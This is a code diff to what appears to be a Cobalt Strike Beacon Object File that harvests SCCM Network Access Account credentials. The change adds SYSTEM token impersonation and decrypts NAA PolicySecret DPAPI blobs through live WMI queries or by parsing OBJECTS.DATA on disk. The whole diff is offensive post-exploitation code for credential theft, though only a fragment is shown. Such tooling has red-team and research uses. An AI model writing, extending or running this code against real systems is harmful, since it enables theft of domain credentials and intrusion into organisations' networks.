@@ -4,13 +4,13 @@
  * Usage:
  *   sccm [/target:PATH]
  *
- * Searches for SCCM Network Access Account (NAA) credentials
- * and task sequence credentials stored in DPAPI blobs.
+ * Defaults to live SCCM WMI triage (CRED-3) and decrypts
+ * NAA PolicySecret blobs locally with CryptUnprotectData as SYSTEM.
+ * If /target:PATH is supplied, parses OBJECTS.DATA from disk (CRED-4).
  * Requires high integrity (admin).
  */
 #include "beacon.h"
 #include "bofdefs.h"
-#include "dpapi_common.h"
 #include "triage.h"
 #include "helpers.h"
 
@@ -29,16 +29,27 @@ void go(char* args, int args_len) {
     wchar_t* target = NULL;
     if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
 
-    MASTERKEY_CACHE cache;
-    mk_cache_init(&cache);
-
-    /* Decrypt machine masterkeys first */
-    triage_system_masterkeys(&cache);
-
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM (BOF) ===\n");
 
-    triage_sccm(&cache, target);
+    BOOL already_system = is_system();
+    BOOL impersonated = FALSE;
 
-    mk_cache_free(&cache);
+    if (!already_system) {
+        if (!get_system()) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
+            if (target) intFree(target);
+            return;
+        }
+        impersonated = TRUE;
+    }
+
+    if (target) {
+        triage_sccm(NULL, target);
+    } else {
+        triage_sccm_wmi();
+    }
+
+    if (impersonated) revert_to_self_helper();
     if (target) intFree(target);
 }
